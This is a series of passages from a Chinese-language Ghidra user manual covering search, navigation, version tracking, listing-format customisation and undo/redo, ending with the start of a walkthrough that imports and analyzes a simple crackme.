Data(Hex&#x2F;Ascii)：表中第一个元素指向的字节的ASCII与十六进制显示。 Length：地址表的长度。 创建地址表 我们同样可以在该窗口当中创建地址表。 1 在表格当中选择一行或多行。 2 勾选Auto Label选项可以在创建地址表时自动创建标签。 3 如必要的话，我们可以在offset输入栏处输入偏移： 图7-13 输入偏移值 对于单个地址表，输入的偏移不能大于地址表长度减一。 对于多个地址表，偏移值不能大于其中最小的地址表长度减一。 输入栏右侧显示了经过调整（即算上了偏移值）的起始地址。当我们选中多个地址表时，此处无显示。 1 点击Make Table按键。 2 一个地址表将会创建于我们所选的位置，包含指向创建的地址的定义地址。 反汇编地址表 1 选中一行或多行。 2 点击Disassemble按键。 7.1.5 搜索直接引用 搜索直接引用（Search for Direct References）功能可以在整个程序当中搜索可能的对当前位置的直接引用。该搜索会尝试寻找组成当前位置地址的字节。搜索的结果也将显示于一个表格当中。 图7-14 搜索直接引用 我们可以通过以下操作搜索直接引用： 1 在陈列窗口当中点击一个地址。 2 选择Search→for Direct References…。 3 这将弹出显示搜索结果的表格窗口。 如果我们选择了一段地址并搜索直接引用，那么该功能将会搜索对于所有选中地址的可能的引用。我们可以通过Ctrl+A选中程序中所有内容，再进行搜索，以搜索程序内存空间中所有可能的引用。 显示结果的表格中有以下的列： From Location：直接引用的地址。 Label：引用所在位置的主要标签。 From Preview：显示引用位置的代码单元定义。 To Location：被引用位置的地址。 To Preview：显示被引用位置的代码单元的定义。 基于对齐值的过滤 图7-15 对齐值过滤 当我们得到搜索结果后，我们可以对引用位置进行基于对齐值的过滤。如上图所示，我们可以选择1&#x2F;2&#x2F;4或8作为想要的对齐值。只有满足所选对齐值的结果才会显示于表格之中。 7.1.6 指令样式搜索 我们可以使用指令样式搜索（Instruction Pattern Search）功能搜索当前程序中的指定指令。 使用该功能的操作如下： 1 在陈列窗口中选择一段地址（不能选择多段地址）。 2 选择 Search→For Instruction Patterns…。 3 这将打开用于搜索指令样式搜索的对话窗口。 图7-16 指令样式搜索 我们可以看到，该窗口分为两个大部分：指令表与预览表。前者包含所有用户选中的指令，而后者显示了用于搜索的字符串。 指令表 该部分位于窗口左侧。 图7-17 指令表 所有选中范围内的内容，即便是非指令，都会显示于该表格当中。指令表上方有一行工具栏。我们可以点击一个方格来将其遮盖。 该样式可以涵盖的指令个数上限为500个。 图7-18 指令表工具栏 从左到右这些图标的作用分别为： 1 清除所有遮盖。 2 遮盖所有数据（非指令）。 3 遮盖所有操作数。 4 遮盖所有标量操作数。 5 遮盖所有地址操作数。 6 根据陈列窗口中的选择内容刷新表格。 7 允许用户手动输入要加载的字节。 8 在陈列窗口中导航至这些指令的位置。 预览表 图7-19 预览表 预览表会显示用于搜索的字符串是什么样子，当我们在指令表当中应用或移除遮盖时，预览表其中的内容会动态地进行对应变化。 当预览表以二进制显示时，遮盖的位会以.显示。 以十六进制显示时，如果字节的某些部分含有遮盖的位，那么十六进制值将不会显示。而是会显示其二进制值，其中遮盖的位同样以.表示。比如图中的。 在预览表的工具栏当中， 图7-20 预览表工具栏 从左到右的图标作用分别为： 1 切换至二进制显示模式。 2 切换至十六进制显示模式。 3 将当前的预览表内容复制到剪切板当中。 我们可以将预览表中内容复制并保存，以便以后使用。 搜索范围 与其他搜索功能类似地，我们可以选择: Entire Program: 在整个程序中进行搜索。 Search Selection: 在当前陈列窗口的选中内容中进行搜索。 Forward: 向前搜索。 Backward: 向后搜索。 搜索结果 配置好以上选项后，我们可以点击Search All按键以显示所有的匹配。如果点击Search，不会有结果表格弹出，但陈列窗口中光标将会移动至下一个匹配的位置。 图7-21 Search All显示所有搜索结果 需要注意的是，该搜索会寻找完全一样的字节样式。比如，当我们在一个程序中复制了其RET指令的样式，该样式在其他程序中很可能无法用于有效地搜索RET指令。 尽管如此，我们也能够根据自己的需求在多个程序当中使用该搜索功能。我们可以在程序A的陈列窗口中做出选择，并切换到开启程序B的工具中，选择该功能。 7.1.7 搜索标量 搜索标量（Search for Scalars）功能可以定位当前程序中的标量操作数或标量值。该搜索基于输入的十六进制或是十进制值。 1 在工具中选择Search→For Scalars。这将弹出如下的窗口。 图7-22 搜索标量 1 可以看到其中的选项有： Scalars in Range：在程序中搜索值居于给定范围内的标量。 Specific Scalar：在程序中搜索给定值的标量。 Search All：搜索程序中所有内存。 Search Selection：在工具内当前选中的内容当中进行搜索。 1 我们可以输入十进制或是十六进制数（0x…）。 2 点击Search以开始搜索。 搜索结果 搜索的结果将被呈现于一个表当中。如之前介绍过的，我们也可以从Window→Scalar Table处直接打开标量表。对其中的内容我们不再重复进行介绍。 图7-23 搜索标量结果 #ghidra使用手册 7.2 导向 我们在使用Ghidra时，经常会有导向至程序中特定位置的需求，而Ghidra也提供了多种不同的导向方法。其中一种在陈列窗口中进行导向的方式我们已经于2.1.2当中进行过介绍。 7.2.1 Go To Go To功能可以帮助我们导航至某个地址、标签、表达式。 1 在工具中选择Navigation→Go To…，或是使用快捷键G。 2 这将弹出一个窗口。 图7-24 Go To窗口 3 我们可以在其中输入地址、标签、或是表达式，并选择OK。 4 如果该地址、标签、或是表达式有效，CodeBrowser将被重定位至那个位置。 5 如无效，该对话窗口将显示一个错误信息。 图7-25 错误信息 导向至地址 我们可以在输入栏中输入地址。输入的值被视为十六进制值。也就是说，0x1000与1000会被视为一样的值。 当程序有多个地址空间且目标地址是模糊的时候，将会显示一个对话。 有如下例子： 一个含有以下内存区块的程序处于不同的地址空间中。 名称|起始地址|结束地址 |-|-|-| BLOCK1|BLOCK1:00000000|BLOCK1:0000ffff BLOCK2|BLOCK2:00000000|BLOCK2:0000ffff BLOCK3|BLOCK3:00000080|BLOCK3:0000ffff 示例1：不模糊的地址 1 将当前位置移动至BLOCK1:00001000。 2 导向至地址5。 3 目标地址不模糊，因为BLOCK1区块含有地址5，所以陈列窗口会移动到地址5。 示例2：模糊的地址 1 将当前位置移动到BLOCK3:00000080。 2 导向至地址5。 3 目标地址模糊，因为 BLOCK3区块不包含地址5。 与此同时，BLOCK1和BLOCK2两个区块都包含地址5。 导向至标签 我们可以通过输入一个存在的标签名进行导向。此时，如下两个选项将会影响到导向的结果。 Case Sensitive： 默认的大小写设置为敏感，也就是说，LAB1000与lab1000不一样。我们可以关闭该选项来同时搜索他们。 Dynamic Labels： 该选项只影响那些可能导致多个结果的搜索。勾选该选项会使Ghidra考虑所有的动态标志（未储存的标志，但是因对某个位置引用被生成）。当该选项被关闭时，只搜索定义的标签，且会显著提高搜索速度。 除此之外，我们可以使用代表任意数量（包括0个）的任意字符。示例如下： 如果我们在寻找以LABEL打头的标签，输入LABEL。 类似地，我们可以用?来表示任意单个字符。 导向至表达式 我们可以输入包括地址、标志的运算表达式。其中的所有数字都将被认为是十六进制数。支持的操作符有+-&#x2F;&lt;&lt;&gt;&gt;。此外，括号也可以用来控制运算的优先级。一些例子： ENTRY+10：标志ENTRY的地址加上0x10。 0x100000+30：地址0x100030。 0x100000+(210)：地址0x100020。 +20：当前地址加上0x20。 错误信息 可能弹出的错误信息如下： 1 This is not a query, label or address：我们输入了无效的地址或不存在的标签。 2 No results for…：搜索结果不存在。 7.2.2 导向至下一个&#x2F;上一个代码单元 导向至下一个或上一个代码单元的功能允许我们能够跳转到下一个&#x2F;上一个指令、数据、未定义数据、函数、或是非函数。该导向基于当前陈列窗口当中的光标位置。 当搜索指令、数据或是未定义数据时，Ghidra会跳过紧接着的同类数据。比如，我们当前的光标位于存在指令的地址上，而我们想要导向至下一个指令，那么所有紧接着当前指令的指令将会被跳过，直到我们找到一个非指令。找到该非指令后，Ghidra才会将我们导向至下一个出现的指令。 我们可以在工具当中选择Navigation，便能够看到以下选项。 图7-26 导向至下个&#x2F;上个代码单元 导向方向 我们可以点击Toggle Code Unit Search Direction来切换搜索方向。向下的箭头图标代表当前在向下搜索，向上的箭头图标则代表当前在向上进行搜索。 导向至指令 点击Next Instruction，我们便能够将陈列窗口中的光标定位于下一个指令上。当目前的搜索方向上不存在下一个指令时，该选项不可用。 导向至数据 点击Next Data，我们便能够将陈列窗口中的光标定位于下一个数据上。当目前的搜索方向上不存在下一个数据时，该选项不可用。 导向至未定义数据 点击Next Undefined，我们便能够将陈列窗口中的光标定位于下一个未定义数据。当目前的搜索方向上不存在下一个未定义数据时，该选项不可用。 导向至标签 点击Next Label，我们便能够将陈列窗口中的光标定位于下一个标签。当目前的搜索方向上不存在下一个标签时，该选项不可用。 导向至函数 点击Next Function，我们便能够将陈列窗口中的光标定位于下一个函数。如果我们在函数内部，且方向朝向更低的地址，我们会被导向至当前函数的入口点。 由于该功能的使用频率可能很高，我们可以通过快捷键来实现导向至下一个或是上一个函数。 按下Ctrl+向下方向键导向至下一个函数，即下一个更大地址的函数入口点。 按下Ctrl+向上方向键导向至上一个函数，即下一个更小地址的函数入口点。 导向至非函数指令 点击Next Instruction Not In a Function，我们便能够将陈列窗口中的光标定位于下一个不在某个函数内的指令区块。当我们手动地创建函数，且越过它们以鉴别候选函数时，该功能可能有用。 导向至不同的字节值 点击Next Different Byte Value，该功能会尝试将我们导向至下一个与当前代码单元中的第一个字节的值不同的代码单元。当我们尝试跨越一长串FF或0时，便可以使用该功能。 导向至书签 点击Next Bookmark，我们便能够将陈列窗口中的光标定位于下一个书签处。当目前的搜索方向上不存在下一个书签时，该选项不可用。 7.2.3 导向历史 Ghidra也同样支持利用导向历史进行导向。当前的地址会被推入一个存放导向历史的栈当中。我们可以利用该功能重新访问之前的位置。 在工具栏当中，可以看到以下图标。 图7-27 导向历史 我们可以点击向左的箭头导向至上一个位置，或是点击向右的箭头导向至下一个位置。包括但不限于以下的操作将被记录至导向历史当中。 1 使用Go To导向至地址或标签。 2 双击包含地址或标签的操作数。 3 双击XREF。 4 在内存映射窗口中点击一个内存区块的起始或结束地址。 5 在等值表当中点击一个地址。 6 使用某个搜索功能。 我们也可以清除导向历史：在工具中选择Navigation→Clear History。 #ghidra使用手册 8.1 创建会话 可以发现，Ghidra自带的工具除了CodeBrowser，还包括一个名为Version Tracking的工具。 版本跟踪（Version Tracking）指鉴别不同的二进制文件当中所匹配的代码或数据。一个常见用处便是用来跟踪同一文件的不同版本。此外，版本跟踪技术也能够用来检查某段特定代码在某个文件当中的出现。 使用版本跟踪工具最常用的情景可能如下：我们分析了某个二进制文件，并注释、标记了一些重要区域的代码。而该软件的开发者发布了新版本的软件，可能包含Bug修复、功能修改等等。这时我们希望我们的分析能够作用于新版本的软件，且不希望丢失之前的进度。而版本跟踪便能够让我们将之前的注释和标签导入到新的内容当中。 另一种常见的使用情况可能是：我们希望检查某些代码在一个文件中是否出现。比如说，给定一小撮函数，来自于代表着已知恶意软件的代码，我们可以在用版本跟踪来寻找文件中的这些代码。 我们接下来将对使用Ghidra中的版本跟踪工具做一步步的介绍。 首先，我们需要创建一个新的版本跟踪会话。我们可以： 1 将两个程序拖动至工具箱上的版本跟踪工具图标上。 抑或是 2 在打开的版本跟踪工具中，选择 Create Session图标。 一个创建会话的窗口将会弹出。在该面板中，我们需要指定储存该会话的位置、名称、源程序与目标程序。源程序（Source Program）是已经被分析，并包含注释、标记的程序，而目标程序（Destination Program）则是将要接受标记、注释的新程序。 图8-1 创建会话面板 选择Next之后，先决条件面板将会弹出。其中包含了一系列的校验程序。这些校验程序会分析源程序与目标程序，寻找可能影响版本跟踪成功执行的潜在问题。比方说，源与目标中，定义的函数个数相差太多的话，可能指示着它们不能被相关联。 图8-2 先决条件 我们按下Run Precondition Checks按钮，便能够看到校验结果。 再次点击Next之后，我们可以看到总览面板，总览面板在创建新的版本跟踪会话之前显示了新会话的总览信息，包括会话名、源程序、目标程序。 图8-3 总览面板 #ghidra使用手册 8.2 匹配表 创建完会话之后，一个主要的版本跟踪工具将会被打开。同时，两个子工具也将会打开。我们可以在主要的版本工具窗口点击 图标来运行某些算法以生成可能的匹配。 所生成的匹配表如下。 图8-4 匹配表 匹配代表着一个程序中的数据或函数与另一个程序中的数据或函数相同。将一个程序中的函数或数据与另一个程序中的组对被称为关联。同一组关联可能被一个和更多的相关性推演算法生成多个匹配意见。当一个匹配被认为是正确时，它会被标记为接受的（accepted）。当一个匹配被接受，该组关联是实际被接受的内容，因此所有作用于该组关联的匹配都会被接受。此外，所有相斥的匹配将会被标记为屏蔽的（blocked）。所谓相斥的匹配是指拥有相同的源地址与不同的目标地址，或是拥有相同的目标地址与不同的源地址。比如说，当一个程序中的A与另一个程序中的X组成的匹配意见被接受时，A与另一个程序中Y的匹配意见将会被屏蔽，因为A不能同时与X和Y相关联。 8.2.1 匹配状态 我们可以在匹配表当中直观的看到每个匹配的基本状态： 状态| 图标 | 描述 |-|-|-| AVAILABLE| |该匹配被接受且应用。 REJECTED| | 该匹配被用户拒绝。 BLOCKED| | 该匹配不能被接受，因为一个相斥的匹配被接受了；我们可以将匹配表按源地址或目标地址排序来查看相斥的关联。 ACCEPTED| |该匹配已被接受。 ACCEPTED - Not Done | | 该匹配已被接受。但至少有一个标记物未被检验。 ACCEPTED - Fully considered| | 该匹配已被接受且所有标记物已被应用或者忽略。 ACCEPTED - Fully Applied| | 该匹配已被接受且所有标记物已被应用。 8.2.2 匹配表内容 以下则是对表格中所有列内容的介绍： Session ID：得到该匹配的相关性推演算法的ID。 Tag：应用于该匹配的用户定义标签。 Status：如上表格，显示图标以说明对应的匹配状态。 Type：说明匹配的为函数或是数据。 Source Label：匹配源地址处的标签。 Dest Laebl：匹配目标地址处的标签。 Multiple Source Labels?：指示该匹配源地址有无多个标签，如有，将指示标签个数，我们可以将光标悬浮于图标上以查看多个标签名称。 Multiple Dest Labels?：指示该匹配目标地址有无多个标签，如有，将指示标签个数，我们可以将光标悬浮于图标上以查看多个标签名称。 Score：该匹配的相似度得分。分值将会位于0.0与1.0之间。该分数指示相匹配的两处的相似程度。我们不应比较不同相似度推演算法得来的匹配得分。 Confidence Score：该匹配的确定性分数。更高的确定性分数指示对于该匹配正确更高的确定性。同样地，我们不应比较不同相似度推演算法得来的确定性分数。 Source Length：源函数或数据的长度。 Dest Length：目标函数或数据的长度。 Votes：从之前接受的匹配引用的数量。 Source Address：源程序中数据或函数的地址。 Dest Address：目标程序中数据或函数的地址。 Algorithm：用于生成该匹配的算法。 Length Delta：源对象与目标对象的长度差。 Source Label Type：源程序中标签的源（导入而来&#x2F;分析得到的&#x2F;用户定义的等等）。 Destination Label Type：目标程序中标签的源（导入而来&#x2F;分析得到的&#x2F;用户定义的等等）。 Markup Status：显示标记物的状态。 #Conflicting：冲突的关联个数。如果我们接受该行中的匹配，这将是将会被屏蔽的关联的个数。 8.2.3 匹配表操作 我们可以在匹配表处做出以下的操作，在任意一行打开右键菜单，可以看到： Accept Match：接受该匹配。所有相斥的匹配将会被屏蔽。 Apply Blocked Match：清除相斥的匹配并应用被因冲突而被屏蔽的该匹配。 Apply Markup：尝试应用所用标记物于该匹配。如果该匹配未被接受，其将先被接受。 Reject Match：将该匹配标记为拒绝的。 Choose Match Tag：从已经编辑好的标签当中选择，并应用于该匹配。 Remove Match Tag：移除选中匹配的标签。 Edit Tag：编辑标签。 Clear Match：将该匹配重设为未接收的，并撤销所有应用的标记。 Remove Match：从匹配表移除一个手动创建的匹配。 Make Selections：在打开源程序的工具与打开目标程序的工具当中做出对应该匹配内容的选择。 8.2.4 匹配表过滤器 除此之外，我们可以通过匹配表格中的过滤器来筛选我们想要的内容。 我们可以在表格的底部看到一些常用的过滤内容。 图8-5 匹配表过滤设置 其中包括： 1 文本：基于我们输入的文本进行筛选。 2 分数：基于相似度分数进行过滤。 3 确定性：基于确定性分数进行过滤。 4 长度：过滤掉比输入长度短的对象。 如图8-5，我们将显示的匹配限制于相似度分数基于0.5到1之间，确定性分数限制于0到1之间，但不对文本和长度做出限制。 此外，我们还可以点击 图标来进行完整的过滤器设置。 图8-6 完整的过滤器设置 如上图，可以设置的内容包括： Match Type：显示函数或数据的匹配。 Associatoin Status：通过关联的状态筛选显示内容。 Symbol Type：通过源或目标对象处标签的符号类型筛选显示内容。 Algorithms：通过使用的相关性推演算法筛选显示内容。 Address Range：通过指定的地址范围限制源或目标地址。 Tags：通过标签限制显示内容。 #ghidra使用手册 8.3 函数表 我们可以在版本跟踪工具当中选择Windows→Version Tracking Functions来打开版本跟踪的函数表格。该表格显示了源程序与目标程序当中所有的函数。我们可以筛选该表格以只显示那些不在匹配中的函数，这样方便我们手动创建匹配。 图8-7 函数表格 如果我们分别选中一个目标函数与一个源函数，而恰好存在他们的匹配时，将会显示消息 A match already exists between &lt;源函数名&gt; and &lt;目标函数名&gt;. 比如，在下图中，我们分别选中目标与源中的main函数。 图8-8 存在匹配 8.3.1 函数表内容 函数表中存在以下列： Label：该列显示函数的标签。 Location：该列显示函数的地址。 Function Signature：该列显示函数签名。 8.3.2 函数表操作 版本跟踪函数表允许我们做出一些操作。首先，我们可以在右键菜单中看到如下的选项： Create Manual Match：该操作允许用户对所选的函数间创建匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。 Create And Accept Manual Match：该操作允许用户对所选的函数间创建匹配，并自动接受该匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。 Create And Apply Munual Match：该操作允许用户对所选的函数间创建匹配，并自动接受且应用该匹配。如果我们没有在两个表中各选中一个函数，该选项将被禁用。 此外，我们在两个表格中各选中一个函数的情况下，点击 图标。匹配表中这两个函数间存在的匹配将被选中。只有当选中函数间存在匹配时，该图标才可用。 与大多数其他表格类似地，我们也可以通过过滤器对表格中的显示内容作出筛选。首先，我们可以在如下图所示处，选择对应选项以进行筛选。 图8-9 筛选选项 Show All Functions：默认选项。显示源程序与目标程序当中所有的函数。 Show Only Unmatched Functions：只显示不处于任何匹配中的函数。我们可以选择该选项以显示所有未被程序关联器匹配的函数。 Show Only Unaccepted Match Functions：只显示不处于任何已接受匹配中的函数。这意味着所显示的函数不处于任何匹配中，抑或是处于未被接受的匹配中。 除去这些选项，我们也可以使用表格下方的文本过滤器。 我们还可以点击 图标，切换是否显示函数的对比面板。如果显示，其将显示于函数表格下方。 8.3 隐含匹配表 一个隐含的匹配即是一个由其他匹配暗示的函数或数据匹配。而隐含匹配表则显示了匹配表中所选中匹配暗示的匹配。比如，我们在匹配表当中选中源程序与目标程序的main函数之间的匹配。 图8-10 隐含匹配表 可以看到两个程序中main函数的匹配的隐含匹配显示于隐含匹配表当中。 8.3.1 隐含匹配表内容 隐含匹配表当中有以下列： Source Reference Address：显示源程序中该隐含匹配的引用地址。 Destination Reference Address：显示目标程序中该隐含匹配的引用地址。 其他列与匹配表中的列含义一样，在此不再赘述。 8.3.2 隐含匹配表操作 我们可以看到隐含匹配表的右上角有这些图标 。 Accept Implied Match：如之前该隐含匹配不在匹配表中，则在匹配表中创建一个匹配。 Navigate References：当该操作被切换至开启状态时，子工具将会被导向至用于生成选中的隐含匹配的引用地址。 Navigate Match：当该操作被切换至开启状态时，子工具将会被导向至所选中的隐含匹配所在的地址。 类似地，我们也可以使用文本过滤器对表格中的内容作出筛选。 #ghidra使用手册 8.4 标记物表 标记一个程序意味着向该程序中添加信息以便我们更好的理解这个程序。我们会在源程序作出标记，并希望将其转移到目标程序的相同函数或数据上。而版本跟踪中的标记物窗口便能够帮助我们做到这一点。标记物表会显示当前所选中匹配的标志物。 图8-11 标记物表 在标记物表的下方，我们可以看到源程序与目标程序的陈列窗口。此外，我们也可以将其切换为反编译窗口查看。 当我们确定一个函数或是数据匹配正确后，我们可以选择应用或是忽略单个标记物。应用标记物将会使目标程序使用源程序的标记物。 8.4.1 标记物表内容 标记物表中含有以下列： Status：当前标记物的状态，指示该标记物未被应用&#x2F;已被应用&#x2F;已被拒绝，等等。 Source Address：源程序中该标记物的地址。 Dest Address：该标记物将会被应用或已被应用于目标程序当中的地址。如果当前的关联器不能决定一个目标地址，且用户没有手动指定一个目标地址，该处为空。 Displacement：显示目标地址与源地址的相对位移。 Markup Type：指示标记物的类型。 Source Value：源地址当中标记物的值。 Current Dest Value：当前目标程序中标记物的值。 Original Dest Value：目标程序中标记物的初始值。如果该标记物仍未被应用，那么该值也将是当前的目标程序中标记物的值。 其中，标记类型（Markup Type）包括以下几种： Function Name：该函数的名称。任何源程序中的非默认名称都可以替换目标程序中的函数名。所谓默认名称，指以FUN_开头的函数名。我们可以选择只替换目标程序中的默认函数名，也可以选择不论是否默认函数名，都对目标程序中的函数名做出替换。 Function Signature：函数签名，其中包括返回类型，参数个数，每个参数的数据类型、名称和注释，函数是否含有可变参数。函数签名标记中，有几个其他的标记应用选项。 Return Type and Parameter DataTypes： 当数据类型（data types）被应用，默认的数据类型，即一个未定义的字节，将不会替代任何其他数据类型。一个指定大小的未定义数据类型将不会替代一个定义的数据类型。一个定义的数据类型可以替代任意其他的数据类型，但当选项被设置为Replace Undefined Data Types Only且目标是一个定义的数据类型时，其不会取代。 Parameter Names： 一个默认的参数名以param_开头。源程序中默认的参数名将不会替代目标程序中定义的参数名。 如果我们对参数名Priority Replace选择，不论替换名称是否基于它们的源类型。该选项让我们决定用户定义名称或是导入名称的更高优先级。我们也可以当它们的源类型相同时，指定源名称是否应该替代目标名称。 Label：位于指令或是定义数据上的标签可以取代或添加与目标程序上的关联地址。我们可以选择只在目标标签为默认时取代，或取代所有目标标签。 EOL Comment、Plate Comment、Pre Comment、Post Comment、Repeatable Comment：源程序中的对应注释可以被添加到目标程序的现存注释中，也可以简单地取代目标注释。 8.4.2 标记物操作 我们可以在标记物表中对标记物进行以下的操作。 操作|描述 |-|-| Apply(Use Options; Force If Necessary)|这个操作会根据当前的标记物匹配选项应用标记物。对于每一个选中的标记物，该操作会强制应用选项。 Apply(Add As Primary)| 该操作会将所选中的标记物源值添加到目标值上。如果可能的话，源标记物将变成首要的标记物。 Apply(Add)| 该操作会将所选中的标记物源值添加到目标值上，目标标记物将仍会是首要的标记物。 Apply(Replace Default Only)| 仅在目标标记物值为默认时，该操作会用所选中的源标记物值替换目标标记物。 Apply(Replace First Only)| 仅当目标标记物处有只有唯一的定义的数据时，才用选中的源标记物替换目标标记物。 Apply(Replace)| 该操作用所选中的源标记物值替换目标标记物。 Don’t Care | 将标记物状态设为不关心。 Don’t Know| 将标记物状态设置为未知。 Reject| 该操作将标记物状态设置为拒绝的，该状态的标记物将在应用于匹配时被忽略。 Edit Destination Address| 我们可以手动地指定目标标记物地址。 Reset|将标记物重置为未应用的状态。 在标记物表格当中，我们同样可以通过设置过滤器对表格的显示内容作出筛选。我们可以使用表格下方的文本过滤器，也可以点击文本框右边的图标打开通过标记物类型或是状态设置过滤器的对话窗口。 图8-12 过滤器设置 8.4.3 对比视图 打开标记物表格后，我们可以看到其下方提供了目标与源程序的对比视图。该视图的显示内容可以为陈列窗口内容，也可以为反编译内容。 图8-13 陈列窗口对比 上图即为陈列窗口对比所显示的内容。我们可以在标记物窗口工具栏的 图标中，选择： Show Listing Format Header： 当该选项被勾选时，将会于陈列窗口的上方显示格式头，以便我们对格式进行修改。修改的方式我们会在下一章介绍Browser Field Formatter时对如何更改陈列窗口的显示格式详细地进行介绍。 Show Listings Side By Side： 当该选项被勾选时，目标程序的显示内容会被显示于源程序右侧。未被勾选时，其将显示于源程序下方。 SYnchronize Scrolling： 当该选项被勾选时，当我们在源窗口或是目标窗口中滚动时，另一个窗口中会同步地进行滚动。未被勾选时，两边的滚动将会是独立的。 我们可以简单地在对比视图中拖动以应用标记物。这是一个快速且直观的应用标记物方法。相比之下，手动地编辑目标地址则比较费时。 拖动只可以将标记物应用于合理的位置。比如，我们不能够拖动一个已被应用的标记物。想要通过拖动应用标记物，点击源程序窗口中的一个标记物，并且将其拖动到目标窗口中想要应用的位置。拖动中，光标会指示所在位置能否被应用，完成拖动后，目标陈列窗口会更新，标记物表格中的标记物状态也会随之改变。 一些标记物只能被应用于特定的位置。举个例子，一个函数的名称或函数的签名只能被应用于函数上。因此目标函数的入口点将为预期的目标地址。在这种情况下，不论我们将标记物拖动到目标函数中的什么位置，目标地址都将变为目标函数的入口点。 #ghidra使用手册 8.5 一个简单的实例 在该示例中，我们先对crackme_example文件进行了分析，并对其做出了一些注释。之后我们想要将已经做出的分析与标记物内容应用于一个叫crackme_example的稍有不同的文件上，以节省时间。 按照8.1的内容中的流程创建好它们的版本跟踪会话后，我们可以看到，一个空的版本跟踪窗口，以及两个用默认CodeBrowser工具打开的程序窗口。我们可以点击红框中的图标，快速地运行关联器，并应用好的匹配。 图8-14 点击红框中的图标 之后，我们基于之前对crackme_example的了解，直接在匹配表格下方的文本过滤器中输入main，以查找main函数。我们先选中main函数，并从Windows→Version Tracking Markup Items中打开标记物表格。 图8-15 许多标记物已经被自动应用 如上图，我们可以看出，所有的标记物已经被自动地应用。通常来说，目标程序与源程序之间改动越多，将会自动应用的标记物就会越少，因为关联器无法确定地将两者间的部分内容相关联。但是在该示例中，两者差距不大，因此我们甚至不需要手动地对版本跟踪会话进行更多的操作，便能够将main函数中所有的标记物应用于目标程序上。 #ghidra使用手册 9.1 陈列窗口格式修改 在2.1中，我们介绍了陈列窗口的功能。之前说过，Ghidra是高度可定制化的，我们可以运用Ghidra提供的Browser Field Formatter来对陈列窗口进行自定义，以便满足我们的需求与喜好。整个修改的过程都非常的简单与可视化。点击位于陈列窗口上方的Browser Field Formatter图标，便可以打开该界面。 图9-1 Browser Field Formatter图标 9.1.1 标签 打开该界面后，我们首先看到最上端有若干标签。 图9-2 Browser Field Formatter界面 这些标签分别代表了不同类别的信息，每一种类型的信息我们都可以单独地对其显示格式进行修改。 类别分别有： 类别名称|描述 Address Break| 分隔不连续的地址 Plate|显示区块的注释，其他种类的注释被包含于Instruction&#x2F;Data类别中 Function| 显示函数签名与函数相关属性 Variable|显示与一个函数相关的返回信息、参数以及局部变量 Instruction&#x2F;Data|显示指令或数据 Open Data| 显示数据结构或数组的内部 每一个地址都有一个或更多的以上类别的信息。当我们移动光标的时候，Browser Field Formatter会自动切换到当前光标位置所对应的标签。此外，当前光标位置所对应的区域也会被高亮显示。如下图所示，当我们将光标移动到一个地址上时，标签会被自动切换至Instruction&#x2F;Data，同时，其中所对应的Address区域会被高亮显示。 图9-3 光标移动至一个地址 9.1.2 调整格式 增加区域 我们可以通过右键点击Browser Field Formatter界面，选择Add Field→&lt;想添加的区域&gt;来添加新的区域。新的区域会被添加至右键点击的位置。 移除区域 右键点击想移除的区域，选择Remove Field。我们也可以右键并选择Remove All Fields来移除所有的区域。 移动区域 Browser Field Formatter中直观的图形界面让移动区域变得十分简单。我们只需要用鼠标拖拽区域便可以实现对其的移动。 禁用区域 右键点击区域，选择Disable Field可将其禁用。禁用区域将仍然占着位置，不过不会在陈列窗口中显示信息。 启用区域 右键点击被禁用的区域，选择Enable Field，便可以使该区域重新在陈列窗口中显示信息。 添加行&#x2F;移除行 如果觉得当前的行数不够放置足够的区域，我们可以右键并选择Insert Row来添加新的空行。这个空行会被添加至右键点击的位置。我们也可以右键并选择Remove Row来移除空行。 重设格式 我们可以通过右键点击Browser Field Formatter，并选中Reset Format来将当前类别标签中的格式恢复为默认设置。如果想要将所有类别的设置都恢复为默认，右键并选择Reset All Formats。 #ghidra使用手册 9.2 撤回操作&#x2F;取消撤回 Ghidra提供了小巧却十分强大的Undo&#x2F;Redo功能，即我们可以撤回做出的操作，也能够在这之后将重应用被撤回的操作。默认存储的操作历史大小为20。当我们执行了一系列的撤回操作后，便能做出同样次数的取消撤回操作。然而，如果我们在撤回操作后进行了其他的编辑，储存重新操作的列表会被清空。 想要撤回上一个做出的操作，选择Edit→Undo，或是在工具栏中点击 图标。 想要取消上一个撤回，选择Edit→Redo，或是在工具栏中点击 图标。 #ghidra使用手册 10.1 一个简单的Crackme 在本章中，我们将会通过一些示例，线性地对Ghidra在实际使用中的操作流程做出示范。 由于我们并不期望正在阅读本章的读者，已经看过之前所有的内容，因此我们将尽量对每一步都做出详细的介绍，让该章节中的内容能单独形成一个简单的操作流程示范。 10.1 一个简单的Crackme 我们打开Ghidra，将想要分析的Crackme文件直接拖动到Ghidra的项目窗口当中。 图10-1 导入程序 可以看到，程序的格式、语言都已经被自动分析，我们可以直接输入在Ghidra中该程序的名称，并点击OK。 图10-2 信息总览 导入完成后，我们可以看到该文件信息总览。我们点击OK关闭该窗口，并在Ghidra的项目窗口中，选中已经导入的该程序，并双击以将其用默认的CodeBrowser工具打开。 打开后，Ghidra将提示我们，”simple_crackme has not been analyzed. Would you like to analyze it now?”。我们选择Yes。一个可以设置分析器的对话窗口将会随之弹出。 图10-3 分析选项 无需对这些选项作出修改，我们直接使用默认的分析器设置，点击Analyze。窗口右下角的进度条将显示分析的进度。该范例中的Crackme文件非常小，因此分析将会极快地结束。 对于这种简单小巧的Crackme，我们往往希望找到main函数作为开始分析的切入点。该示例中，我们在界面左侧的Symbol Tree窗口中，点击Functions→main。 图10-4 选中main函数 之后我们可以看到，在陈列（Listing）窗口与反编译（Decompile）窗口当中，显示出了main函数所对应的内容。 图10-5 main的反编译内容 我们可以从函数签名入手，对数据类型做出的定义，由于对一个数据类型的定义将会传播至程序中各个位置，所以这是一个高效的切入点。 如上图，我们可以看到，Ghidra反编译器得到的函数签名为: undefined8 main(int iParm1, undefined8* puParm2) 不难看出，我们需要将其还原为符合C标准的main函数函数签名，也即 int main(int argc, char *argv) 我们在反编译窗口中，右键并选择Edit Function Signature，并将其进行修改。 需要注意的是，由于Ghidra反编译器的特性，argv之中的并不会被当成数组的标志，而是将被看待为参数名称的一部分。所以我们需要将char* argv[]以char** argv的形式进行表示 图10-6 修改函数签名 修改并应用新的函数签名后，我们可以看到，反编译的结果变得十分明了了。 图10-7 更改函数签名后的编译结果 